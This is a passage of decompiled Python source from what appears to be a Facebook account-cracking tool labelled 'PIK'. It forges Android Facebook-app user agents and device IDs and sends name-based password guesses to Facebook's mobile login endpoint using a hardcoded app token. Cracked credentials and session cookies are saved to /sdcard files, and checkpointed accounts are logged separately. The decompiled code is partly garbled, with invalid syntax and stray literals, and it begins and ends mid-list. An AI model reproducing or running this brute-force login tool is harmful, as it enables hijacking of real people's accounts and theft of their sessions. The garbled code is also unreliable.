'GT-E3309T', 'GT-G530H', 'GT-G930F', 'GT-H9500', 'GT-I5508', 'GT-I5801', 'GT-I6410', 'GT-I8150', 'GT-I8160OKLTPA', 'GT-I8160ZWLTTT', 'GT-I8258', 'GT-I8262D', 'GT-I8268GT-I8505', 'GT-I8530BAABTU', 'GT-I8530BALCHO', 'GT-I8530BALTTT', 'GT-I8550E', 'GT-I8750', 'GT-I900', 'GT-I9008L', 'GT-I9080E', 'GT-I9082C', 'GT-I9082EWAINU', 'GT-I9082i', 'GT-I9100G', 'GT-I9100LKLCHT', 'GT-I9100M', 'GT-I9100P', 'GT-I9100T', 'GT-I9105UANDBT', 'GT-I9128E', 'GT-I9128I', 'GT-I9128V', 'GT-I9158P', 'GT-I9158V', 'GT-I9168I', 'GT-I9190', 'GT-I9192', 'GT-I9192I', 'GT-I9195H', 'GT-I9195L', 'GT-I9250', 'GT-I9300', 'GT-I9300I', 'GT-I9301I', 'GT-I9303I', 'GT-I9305N', 'GT-I9308I', 'GT-I9500', 'GT-I9505G', 'GT-I9505X', 'GT-I9507V', 'GT-I9600', 'GT-M5650', 'GT-N5000S', 'GT-N5100', 'GT-N5105', 'GT-N5110', 'GT-N5120', 'GT-N7000B', 'GT-N7005', 'GT-N7100', 'GT-N7100T', 'GT-N7102', 'GT-N7105', 'GT-N7105T', 'GT-N7108', 'GT-N7108D', 'GT-N8000', 'GT-N8005', 'GT-N8010', 'GT-N8020', 'GT-N9000', 'GT-N9505', 'GT-P1000CWAXSA', 'GT-P1000M', 'GT-P1000T', 'GT-P1010', 'GT-P3100B', 'GT-P3105', 'GT-P3108', 'GT-P3110', 'GT-P5100', 'GT-P5110', 'GT-P5200', 'GT-P5210', 'GT-P5210XD1', 'GT-P5220', 'GT-P6200', 'GT-P6200L', 'GT-P6201', 'GT-P6210', 'GT-P6211', 'GT-P6800', 'GT-P7100', 'GT-P7300', 'GT-P7300B', 'GT-P7310', 'GT-P7320', 'GT-P7500D', 'GT-P7500M', 'SAMSUNG', 'LMY4', 'LMY47V', 'MMB29K', 'MMB29M', 'LRX22C', 'LRX22G', 'NMF2', 'NMF26X', 'NMF26X;', 'NRD90M', 'NRD90M;', 'SPH-L720', 'IML74K', 'IMM76D', 'JDQ39', 'JSS15J', 'JZO54K', 'KOT4', 'KOT49H', 'KOT4SM-T310', 'KTU84P', 'SM-A500F', 'SM-A500FU', 'SM-A500H', 'SM-G532F', 'SM-G900F', 'SM-G920F', 'SM-G930F', 'SM-G935', 'SM-G950F', 'SM-J320F', 'SM-J320FN', 'SM-J320H', 'SM-J320M', 'SM-J510FN', 'SM-J701F', 'SM-N920S', 'SM-T111', 'SM-T230', 'SM-T231', 'SM-T235', 'SM-T280', 'SM-T311', 'SM-T315', 'SM-T525', 'SM-T531', 'SM-T535', 'SM-T555', 'SM-T561', 'SM-T705', 'SM-T805', 'SM-T820')

def api(ids, names, passlist):
    global loop
    sys.stdout.write(f'''\r\r\x1b[1;37m [PIK-XZ] {loop!s}|\x1b[1;37mOK:-{len(oks)!s} \x1b[1;37m''')
    sys.stdout.flush()
    fn = names.split(' ')[0]
    ln = names.split(' ')[1]
    ln = fn
    for pw in passlist:
        pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
        fbbv = str(random.randint(111111111, 999999999))
        android_version = device['android_version']
        model = device['model']
        build = device['build']
        fblc = device['fblc']
        fbcr = sim_id
        fbmf = device['fbmf']
        fbbd = device['fbbd']
        fbdv = device['fbdv']
        fbsv = device['fbsv']
        fbca = device['fbca']
        fbdm = device['fbdm']
        fbfw = '1'
        fbrv = '0'
        fban = 'FB4A'
        fbpn = 'com.facebook.katana'
        en = random.choice([
            'en_US',
            'en_GB'])
        motorola = random.choice([
            'M Bot 54',
            'M Bot 60',
            'M1',
            'M3',
            'M3s',
            'M5 Lite',
            'M6 Note',
            'Magic',
            'Maimang 5',
            'Mate 10 Lite Dual SIM',
            'Mate 20 X (China)',
            'Mate 8',
            'MB526',
            'Medias X',
            'MI 2',
            'MI 3W',
            'Mi 4 LTE',
            'MI 4i',
            'MI 5',
            'MI 5X',
            'Mi A1',
            'Mi Max',
            'Mi Max 2',
            'Mi Mix 2',
            'Milestone',
            'Miracle',
            'Moment (Sprint)',
            'Monza',
            'Motion Plus',
            'Moto C',
            'Moto E2 (4G LTE)',
            'Moto E3 Power',
            'Moto E4',
            'Moto E4 Plus',
            'Moto E5',
            'Moto E5 Plus',
            'Moto G',
            'Moto G 2nd Gen',
            'Moto G Play',
            'Moto G3',
            'Moto G3 Turbo Edition',
            'Moto G4',
            'Moto G5 Plus',
            'Moto G5s',
            'Moto G5s Plus',
            'Moto G6',
            'Moto X',
            'Moto X 2nd Gen (AT&T)',
            'Moto Z',
            'Multipad 2 Ultra Duo 8.0 3G',
            'MultiPhone 3350 Duo',
            'MultiPhone 4044 Duo',
            'MultiPhone 5504 DUO',
            'Multiphone 7600 Duo',
            'MX2',
            'MX380',
            'MX5'])
        mmp = random.choice([
            '13 Pro',
            'Black Shark',
            'Black Shark 2',
            'Black Shark 3',
            'Black Shark 3S',
            'Black Shark 4',
            'Black Shark 4 Pro',
            'Black Shark 5',
            'Black Shark 5 Pro',
            'Black Shark Helo',
            'Civi',
            'Civi 2',
            'Hongmi',
            'Hongmi 1S',
            'Hongmi 2',
            'Hongmi 2 3G',
            'Hongmi 2 4G',
            'Hongmi 4G',
            'Hongmi Note 1TD',
            'Mi Box 4',
            'Mi Cancro',
            'Mi CC 9',
            'Mi CC 9 Pro',
            'Mi CC 9e',
            'Mi CC9',
            'Mi Laser Projector 150',
            'Mi Max',
            'Mi Max 2',
            'Mi Max 3',
            'Mi MAX2',
            'Mi Max3',
            'Mi Mix',
            'Mi Mix 2',
            'Mi Mix 2S',
            'Mi Mix 3',
            'Mi Mix 3 5G',
            'Mi Mix 4',
            'Mi Mix Fold',
            'Mi Note 10',
            'Mi Note 10 Lite',
            'Mi Note 10 Pro',
            'Mi Note 11',
            'Mi Note 2',
            'Mi Note 3',
            'Mi Note 8',
            'Mi Note LTE',
            'Mi Note Pro',
            'Mi Note10',
            'Mi Note5',
            'Mi One',
            'Mi One C1',
            'Mi One Plus',
            'Mi Pad',
            'Mi Pad 2',
            'Mi Pad 3',
            'Mi Pad 4',
            'Mi Pad 4 Plus',
            'Mi Pad 5',
            'Mi Pad 5 Pro',
            'Mi Pad 5 Pro 5G',
            'Mi Pad4',
            'Mi Pad5',
            'Mi Play',
            'Mi XL',
            'Mi5',
            'MiTV 4A',
            'MiTV 4A Pro',
            'MiTV 4C',
            'MiTV 4I',
            'MiTV 4S',
            'MiTV 4X',
            'MiTV P1',
            'MiTV Q1',
            'MiTV Stick',
            'MiTV Stick 4K',
            'Mix Fold 2',
            'MT6765 G Series',
            'Note 12 Pro',
            'Pad 6 Pro',
            'Pocophone F1',
            'Qin 1s+',
            'Qin 2',
            'Qin 2 Pro',
            'Redmi 11',
            'Redmi 12',
            'Redmi 2',
            'Redmi 3',
            'Redmi 4',
            'Redmi 5',
            'Redmi 6',
            'Redmi 7',
            'Redmi 8',
            'Redmi 9',
            'Redmi A1',
            'Redmi A2',
            'Redmi A3',
            'Redmi K30',
            'Redmi K40',
            'Redmi K50',
            'Redmi K60',
            'Redmi note',
            'Redmi Note 1',
            'Redmi Note 10Redmi Note 11',
            'Redmi Note 12',
            'Redmi Note 12T',
            'Redmi Note 13',
            'Redmi Note 15 Pro',
            'Redmi Note 2',
            'Redmi Note 3',
            'Redmi Note 4',
            'Redmi Note 5',
            'Redmi Note 5 Pro',
            'Redmi Note 6',
            'Redmi Note 7',
            'Redmi Note 7 Pro',
            'Redmi Note 8 Pro',
            'Redmi Note 8T',
            'Redmi Note 9',
            'Redmi Note 9 5G',
            'Redmi Note 9 Pro',
            'Redmi Note 9 Pro 5G',
            'Redmi Note 9 Pro Max',
            'Redmi Note 9S',
            'Redmi Note 9T',
            'Redmi Note 9T 5G',
            'Redmi Note Prime',
            'Redmi Note10',
            'Redmi Note10T',
            'Redmi Note7',
            'Redmi Note8',
            'Redmi Note8T',
            'Redmi Note9',
            'Redmi Pad',
            'Redmi Pro',
            'Redmi S2',
            'Redmi X',
            'Redmi Y1',
            'Redmi Y1 Lite',
            'Redmi Y2',
            'Redmi Y3',
            'Redmi 2',
            'Redmi 3',
            'Redmi 3S',
            'Redmi 4',
            'Redmi 4A',
            'Redmi 4X',
            'Redmi 5',
            'Redmi 5 Plus',
            'Redmi 5A',
            'Redmi 6',
            'Redmi Note',
            'Redmi Note 3',
            'Redmi Note 4',
            'Redmi Note 4X',
            'Redmi Note 5',
            'Redmi Note 5 Pro',
            'Redmi Note 5A',
            'Redmi Note 5A Prime',
            'Redmi S2',
            'Redmi Y1',
            'Redmi Y1 Lite',
            'Redmi Y2',
            'Rex 60',
            'Rex 80',
            'Rhyme',
            'RM-560',
            'Ruby'])
        mmm = random.choice([
            'Ruby',
            'V10 (AT&T)',
            'V10 (T-Mobile)',
            'V10 (Verizon)',
            'V1Max',
            'V20',
            'V20 (AT&T)',
            'V20 (Sprint)',
            'V20 (T-Mobile)',
            'V20 (Verizon)',
            'V3',
            'V5',
            'V5s',
            'V7',
            'V7 Plus',
            'V808',
            'V9',
            'Valencia',
            'Vdeo 2',
            'Vega Iron 2 WiFi',
            'Vibe K5',
            'Vibe K5 Note',
            'Vibe K5 Plus Dual SIM',
            'Vibe X',
            'Vibe Z',
            'Vision',
            'Vision 3 Dual SIM',
            'Volt LS740',
            'VR Bot 552',
            'VX5500',
            'Y21',
            'Y21L',
            'Y28',
            'Y3 (2018)',
            'Y336-U02',
            'Y5 Dual SIM (2017)',
            'Y5 II',
            'Y5 Prime 2018 Dual SIM',
            'Y51',
            'Y51L',
            'Y55L',
            'Y6 (2018)',
            'Y6 Dual SIM (2018)',
            'Y6 Prime (2018)',
            'Y65',
            'Y66',
            'Y69',
            'Y71',
            'Y81',
            'Y83',
            'Yota Phone 2',
            'YP-GI1'])
        bbbb = random.choice([
            'PQ3B.190801.002',
            'PQ1A.181205.002.A1',
            'G950FXXU4DSBA',
            'G950FXXS5DSF1',
            'G950FXXS8DTC6',
            'G998USQU1ATCU',
            'G985FXXU7DTJ2',
            'N986BXXU1BTJ4',
            'A525FXXU3AUG4',
            'T970XXU3BUI7',
            'F916BXXU1BTKF',
            'N970FXXS8ETK4',
            'G975USQU4ETG1',
            'A715FXXU3ATI8',
            'T500XXU3BUA8',
            'OPM6.171019.030.K1',
            'OPM2.171026.006.C1',
            'TQ1A.230105.001.A3',
            'SQ1A.211205.008',
            'SD1A.210817.037.A1',
            'RP1A.201005.004.A1',
            'PQ1A.181205.006',
            'N9F27L',
            'PPR1.180610.011',
            'PPR2.180905.006',
            'QP1A.191105.003',
            'RD1A.201105.003.C1',
            'MMB29U',
            'NDE63H',
            'N4F26J',
            'NMF27D',
            'N4F26X',
            'KOT49H',
            'JWR66L',
            'LMY48G',
            'LMY48J',
            'MDB08M',
            'HLK75H',
            'HLK75F',
            'HRI83',
            'HLK75C',
            'EPE54B',
            'G950FXXU3CRGH',
            'G950FXXS6DTA1'])
        mmmmm = random.choice([
            'Optimus Vu',
            'OT-7025D',
            'P10 Lite LTE',
            'P2',
            'P20 Lite',
            'P30 Pro (Global)',
            'P3400',
            'P55 Max',
            'P7 Max',
            'P8 Lite',
            'P9 Lite',
            'Pacific 800i',
            'Pearl 8100',
            'Phoenix 2',
            'Phone',
            'Pixel',
            'Pixel 3',
            'Pixel XL',
            'Pixi',
            'Prada 3.0',
            'Pre3',
            'Primo GH7',
            'Quad EVO Energy 5',
            'Quantum 4',
            'Radar 4G',
            'Radar C110e',
            'Realme 2',
            'Red Rice',
            'Redmi 2',
            'Redmi 3',
            'Redmi 4',
            'Redmi 5',
            'Redmi 5 Plus',
            'Redmi 5A',
            'Redmi 6',
            'Redmi Note 3',
            'Redmi Note 4',
            'Redmi Note 5',
            'Redmi S2',
            'Redmi Y1',
            'Redmi Y2',
            'Rex 60',
            'Rex 80',
            'Rhyme',
            'RM-560',
            'Ruby',
            'S4502M',
            'S4505M',
            'S4702M',
            'S580',
            'S616',
            'S660',
            'Sensation',
            'SGH-E250',
            'SGH-I547',
            'SM-G485F',
            'Spark',
            'Star 3 Duos',
            'Storm 9530',
            'Stream',
            'Stylo 2 Plus (T-Mobile)',
            'Stylus 2',
            'TM-4377',
            'Torch 4G 9810'])
        mmmm = random.choice([
            'Optimus Vu',
            'OT-7025D',
            'P10 Lite LTE',
            'P2',
            'P20 Lite',
            'P30 Pro (Global)',
            'P3400',
            'P55 Max',
            'P7 Max',
            'P8 Lite',
            'P9 Lite',
            'Pacific 800i',
            'Pearl 8100',
            'Phoenix 2',
            'Phone',
            'Pixel',
            'Pixel 3',
            'Pixel XL',
            'Pixi',
            'Prada 3.0',
            'Pre3',
            'Primo GH7',
            'Quad EVO Energy 5',
            'Quantum 4',
            'Radar 4G',
            'Radar C110e',
            'Realme 2',
            'Red Rice',
            'Redmi 2',
            'Redmi 3',
            'Redmi 4',
            'Redmi 5',
            'Redmi 5 Plus',
            'Redmi 5A',
            'Redmi 6',
            'Redmi Note 3',
            'Redmi Note 4',
            'Redmi Note 5',
            'Redmi S2',
            'Redmi Y1',
            'Redmi Y2',
            'Rex 60',
            'Rex 80',
            'Rhyme',
            'RM-560',
            'Ruby',
            'S4502M',
            'S4505M',
            'S4702M',
            'S580',
            'S616',
            'S660',
            'Sensation',
            'SGH-E250',
            'SGH-I547',
            'SM-G485F',
            'Spark',
            'Star 3 Duos',
            'Storm 9530',
            'Stream',
            'Stylo 2 Plus (T-Mobile)',
            'Stylus 2',
            'TM-4377',
            'Torch 4G 9810'])
        cph = random.choice([
            'CPH1979',
            'CPH1983',
            'CPH1987',
            'CPH2005',
            'CPH2009',
            'CPH2015',
            'CPH2059',
            'CPH2061',
            'CPH2065',
            'CPH2069',
            'CPH2071',
            'CPH2073',
            'CPH2077',
            'CPH2091',
            'CPH2095',
            'CPH2099',
            'CPH2137',
            'CPH2139',
            'CPH2145',
            'CPH2161',
            'CPH2185',
            'CPH2201',
            'CPH2209',
            'CPH1801',
            'CPH1803',
            'CPH1805',
            'CPH1809',
            'CPH1827',
            'CPH1837',
            'CPH1851',
            'CPH1853'])
        network = random.choice([
            'Zong',
            'null',
            'Marshmallow',
            'Telekom China'])
        ua = random.choice([
            '[FBAN/FB4A;FBAV/196.0.0.63;FBPN/com.facebook.katana;FBLC/es_MX;FBBV/238098195;FBCR/Jazz;FBMF/Huawei;FBBD/Huawei;FBDV/Huawei Mate 20 Pro;FBSV/4.1.3;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]',
            '[FBAN/FB4A;FBAV/196.0.0.74;FBPN/com.facebook.katana;FBLC/it_IT;FBBV/922832154;FBCR/Lycamobile;FBMF/Samsung;FBBD/Samsung;FBDV/Samsung Galaxy A50;FBSV/7.5.9;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/2;]',
            '[FBAN/FB4A;FBAV/196.0.0.45;FBPN/com.facebook.katana;FBLC/hi_IN;FBBV/917329377;FBCR/VIVIFI;FBMF/Redmi;FBBD/Redmi;FBDV/Redmi 3X;FBSV/8.3.5;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]',
            '[FBAN/FB4A;FBAV/196.0.0.96;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/855385905;FBCR/HUMANS;FBMF/Redmi;FBBD/Redmi;FBDV/Redmi 1;FBSV/9.1.7;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/3;]',
            '[FBAN/FB4A;FBAV/196.0.0.40;FBPN/com.facebook.katana;FBLC/it_IT;FBBV/250554931;FBCR/Ufone;FBMF/Black;FBBD/Black;FBDV/Black Shark 2 Pro;FBSV/9.8.8;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/2;]',
            '[FBAN/FB4A;FBAV/196.0.0.74;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/704797757;FBCR/Spectrum;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Xiaomi Mi Mix 3;FBSV/5.4.7;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/2;]',
            '[FBAN/FB4A;FBAV/196.0.0.26;FBPN/com.facebook.katana;FBLC/hi_IN;FBBV/782459869;FBCR/O2;FBMF/Civi;FBBD/Civi;FBDV/Civi 2;FBSV/4.2.8;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]',
            '[FBAN/FB4A;FBAV/196.0.0.57;FBPN/com.facebook.katana;FBLC/si_LK;FBBV/698339693;FBCR/Metro by T-Mobile;FBMF/Redmi;FBBD/Redmi;FBDV/Redmi 10 Prime;FBSV/9.6.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/3;]',
            '[FBAN/FB4A;FBAV/196.0.0.56;FBPN/com.facebook.katana;FBLC/zh_CN;FBBV/524641632;FBCR/giga;FBMF/Samsung;FBBD/Samsung;FBDV/Samsung Galaxy S10e;FBSV/5.3.8;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/2;]',
            '[FBAN/FB4A;FBAV/196.0.0.19;FBPN/com.facebook.katana;FBLC/ko_KR;FBBV/358408951;FBCR/Sprint;FBMF/LG;FBBD/LG;FBDV/LG Stylo 4;FBSV/5.3.2;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/2;]',
            '[FBAN/FB4A;FBAV/196.0.0.68;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/703069701;FBCR/NL KPN;FBMF/Mi;FBBD/Mi;FBDV/Mi 10T ProNote 12 Pro;FBSV/5.2.7;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]',
            '[FBAN/FB4A;FBAV/196.0.0.69;FBPN/com.facebook.katana;FBLC/hi_IN;FBBV/305250854;FBCR/Club;FBMF/Motorola;FBBD/Motorola;FBDV/Motorola Moto X4;FBSV/4.6.5;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]',
            '[FBAN/FB4A;FBAV/196.0.0.63;FBPN/com.facebook.katana;FBLC/sk_SK;FBBV/507203264;FBCR/WOM;FBMF/Redmi;FBBD/Redmi;FBDV/Redmi 10 Prime (2022);FBSV/10.8.7;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]',
            '[FBAN/FB4A;FBAV/196.0.0.46;FBPN/com.facebook.katana;FBLC/pt_BR;FBBV/566746003;FBCR/Geocell;FBMF/Redmi;FBBD/Redmi;FBDV/Redmi 6 Pro;FBSV/6.5.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]',
            '[FBAN/FB4A;FBAV/196.0.0.86;FBPN/com.facebook.katana;FBLC/es_MX;FBBV/587846208;FBCR/ZZ;FBMF/Redmi;FBBD/Redmi;FBDV/Redmi 5 Pro;FBSV/5.4.8;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/3;]',
            '[FBAN/FB4A;FBAV/196.0.0.33;FBPN/com.facebook.katana;FBLC/ja_JP;FBBV/509256224;FBCR/A-Mobile;FBMF/Sony;FBBD/Sony;FBDV/Sony Xperia XZ2;FBSV/8.7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/3;]',
            '[FBAN/FB4A;FBAV/196.0.0.40;FBPN/com.facebook.katana;FBLC/it_IT;FBBV/703656092;FBCR/Plus;FBMF/LG;FBBD/LG;FBDV/LG K40;FBSV/5.3.9;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/2;]',
            '[FBAN/FB4A;FBAV/196.0.0.77;FBPN/com.facebook.katana;FBLC/ko_KR;FBBV/383774995;FBCR/VIVO;FBMF/Redmi;FBBD/Redmi;FBDV/Redmi 1;FBSV/10.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/2;]',
            '[FBAN/FB4A;FBAV/196.0.0.82;FBPN/com.facebook.katana;FBLC/hi_IN;FBBV/693184888;FBCR/VIVO;FBMF/Galaxy;FBBD/Galaxy;FBDV/Galaxy S9;FBSV/7.6.8;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/2;]',
            '[FBAN/FB4A;FBAV/196.0.0.54;FBPN/com.facebook.katana;FBLC/np_NP;FBBV/747096865;FBCR/Turkcell;FBMF/Mi;FBBD/Mi;FBDV/Mi 10 Lite 5G;FBSV/6.5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/2;]'])
        random_seed = random.Random()
        adid = str(''.join(random_seed.choices(string.hexdigits, k = 16)))
        device_id = str(uuid.uuid4())
        secure = str(uuid.uuid4())
        family = str(uuid.uuid4())
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        xd = str(''.join(random_seed.choices(string.digits, k = 20)))
        sm = [
            'GT-',
            'SM-']
        sim_serials = f'''["{xd}"]'''
        li = [
            '28',
            '29',
            '210']
        li2 = random.choice(li)
        j1 = (lambda .0: for _ in .0:
random.choice(digits)None)(range(2)())
        jazoest = li2 + j1
        data = {
            'method': 'auth.login',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
            'api_key': '882a8490361da98702bf97a021ddc14d' }
        headers = '706'
        url = 'https://b-graph.facebook.com/auth/login'
        twf = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'
        po = requests.post(url, data = data, headers = headers).json()
        if 'session_key' in po:
            print('\r\r\x1b[1;32m [PIK-OK] ' + ids + ' | ' + pas + '\x1b[1;97m')
            open('/sdcard/PIK-OK.txt', 'a').write(ids + '|' + pas + '\n')
            oks.append(ids)
            'Content-Length'
        if twf in str(po):
            if 'y' in pcp:
                print('\r\r \x1b[1;34m[PIK-2F] ' + ids + ' | ' + pas)
                twf.append(ids)
                'd29d67d37eca387482a8a5b740f84f62'
        if 'www.facebook.com' in po['error']['message']:
            if 'y' in pcp:
                print('\r\r\x1b[1;31m [PIK-CP] ' + ids + ' | ' + pas + '\x1b[1;97m')
                open('/sdcard/PIK-CP.txt', 'a').write(ids + '|' + pas + '\n')
                'x-fb-connection-token'
            open('/sdcard/PIK-CP.txt', 'a').write(ids + '|' + pas + '\n')
            'True'
        loop += 1
        return None
        if Exception:
            e = 'X-FB-Server-Cluster'
            e = None
            del e
            return None
        e = 'X-FB-Server-Cluster'
        del e


def api1(ids, names, passlist):
    global loop
    sys.stdout.write(f'''\r\r\x1b[1;37m [PIK] {loop!s}|\x1b[1;37mOK:-{len(oks)!s} \x1b[1;37m''')
    sys.stdout.flush()
    for pas in passlist:
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
        fbbv = str(random.randint(111111111, 999999999))
        android_version = device['android_version']
        model = device['model']
        build = device['build']
        fblc = device['fblc']
        fbcr = sim_id
        fbmf = device['fbmf']
        fbbd = device['fbbd']
        fbdv = device['fbdv']
        fbsv = device['fbsv']
        fbca = device['fbca']
        fbdm = device['fbdm']
        fbfw = '1'
        fbrv = '0'
        fban = 'FB4A'
        fbpn = 'com.facebook.katana'
        en = random.choice([
            'en_US',
            'en_GB'])
        cph = random.choice([
            'CPH1979',
            'CPH1983',
            'CPH1987',
            'CPH2005',
            'CPH2009',
            'CPH2015',
            'CPH2059',
            'CPH2061',
            'CPH2065',
            'CPH2069',
            'CPH2071',
            'CPH2073',
            'CPH2077',
            'CPH2091',
            'CPH2095',
            'CPH2099',
            'CPH2137',
            'CPH2139',
            'CPH2145',
            'CPH2161',
            'CPH2185',
            'CPH2201',
            'CPH2209',
            'CPH1801',
            'CPH1803',
            'CPH1805',
            'CPH1809',
            'CPH1827',
            'CPH1837',
            'CPH1851',
            'CPH1853'])
        network = random.choice([
            'Zong',
            'null',
            'Marshmallow',
            'Telekom China'])
        ua = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 77)) + ';FBBV/' + str(random.randint(1111111, 7777777)) + ';[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM({density=1.0,width=600,height=976};FBLC/es_LA;FBCR/MOVISTAR;FBMF/Rockchip;FBBD/K5-3G;FBPN/com.facebook.katana;FBDV/K5-3G;FBSV/5.1.1;nullFBCA/x86:armeabi-v7a;]'
        random_seed = random.Random()
        adid = str(''.join(random_seed.choices(string.hexdigits, k = 16)))
        device_id = str(uuid.uuid4())
        secure = str(uuid.uuid4())
        family = str(uuid.uuid4())
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        xd = str(''.join(random_seed.choices(string.digits, k = 20)))
        sm = [
            'GT-',
            'SM-']
        sim_serials = f'''["{xd}"]'''
        li = [
            '28',
            '29',
            '210']
        li2 = random.choice(li)
        j1 = (lambda .0: for _ in .0:
random.choice(digits)None)(range(2)())
        jazoest = li2 + j1
        data = {
            'adid': adid,
            'format': 'json',
            'device_id': device_id,
            'email': ids,
            'password': pas,
            'generate_analytics_claims': '1',
            'credentials_type': 'password',
            'source': 'login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'fb_api_req_friendly_name': 'authenticate' }
        headers = {
            'Authorization': f'''OAuth {accessToken}''',
            'X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Type': 'unknown',
            'User-Agent': PIK_UA(),
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger' }
        url = 'https://b-graph.facebook.com/auth/login'
        twf = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'
        po = requests.post(url, data = data, headers = headers).json()
        if 'session_key' in po:
            uid = po['uid']
            ''.join
            uid = ids
            if str(uid) in oks:
                pass
            print('\r\r\x1b[1;32m [PIK-OK] ' + str(uid) + ' | ' + pas + '\x1b[1;97m')
            coki = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(po['session_cookies']())
            open('/sdcard/PIK-COKIE.txt', 'a').write(str(uid) + '|' + pas + ' | ' + coki + '\n')
            open('/sdcard/PIK-rnd-OK.txt', 'a').write(str(uid) + '|' + pas + '\n')
            oks.append(str(uid))
            ';'.join
        if 'www.facebook.com' in po['error']['message']:
            uid = po['error']['error_data']['uid']
            uid = ids
            if uid in oks:
                pass
            open('/sdcard/PIK-rnd-CP.txt', 'a').write(str(uid) + '|' + pas + '\n')
            cps.append(str(ids))
        loop += 1
        return None
        if Exception:
            e = None
            e = None
            del e
            return None
        e = None
        del e


def rndm(ids, passlist):
    global loop
    sys.stdout.write(f'''\r\r\x1b[1;37m [PIK] {loop!s}|\x1b[1;37mOK:-{len(oks)!s} \x1b[1;37m''')
    sys.stdout.flush()
    for pas in passlist:
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
        fbbv = str(random.randint(111111111, 999999999))
        android_version = device['android_version']
        model = device['model']
        build = device['build']
        fblc = device['fblc']
        fbcr = sim_id
        fbmf = device['fbmf']
        fbbd = device['fbbd']
        fbdv = device['fbdv']
        fbsv = device['fbsv']
        fbca = device['fbca']
        fbdm = device['fbdm']
        fbfw = '1'
        fbrv = '0'
        fban = 'FB4A'
        fbpn = 'com.facebook.katana'
        en = random.choice([
            'en_US',
            'en_GB'])
        motorola = random.choice([
            'M Bot 54',
            'M Bot 60',
            'M1',
            'M3',
            'M3s',
            'M5 Lite',
            'M6 Note',
            'Magic',
            'Maimang 5',
            'Mate 10 Lite Dual SIM',
            'Mate 20 X (China)',
            'Mate 8',
            'MB526',
            'Medias X',
            'MI 2',
            'MI 3W',
            'Mi 4 LTE',
            'MI 4i',
            'MI 5',
            'MI 5X',
            'Mi A1',
            'Mi Max',
            'Mi Max 2',
            'Mi Mix 2',
            'Milestone',
            'Miracle',
            'Moment (Sprint)',
            'Monza',
            'Motion Plus',
            'Moto C',
            'Moto E2 (4G LTE)',
            'Moto E3 Power',
            'Moto E4',
            'Moto E4 Plus',
            'Moto E5',
            'Moto E5 Plus',
            'Moto G',
            'Moto G 2nd Gen',
            'Moto G Play',
            'Moto G3',
            'Moto G3 Turbo Edition',
            'Moto G4',
            'Moto G5 Plus',
            'Moto G5s',
            'Moto G5s Plus',
            'Moto G6',
            'Moto X',
            'Moto X 2nd Gen (AT&T)',
            'Moto Z',
            'Multipad 2 Ultra Duo 8.0 3G',
            'MultiPhone 3350 Duo',
            'MultiPhone 4044 Duo',
            'MultiPhone 5504 DUO',
            'Multiphone 7600 Duo',
            'MX2',
            'MX380',
            'MX5'])
        mmp = random.choice([
            '13 Pro',
            'Black Shark',
            'Black Shark 2',
            'Black Shark 3',
            'Black Shark 3S',
            'Black Shark 4',
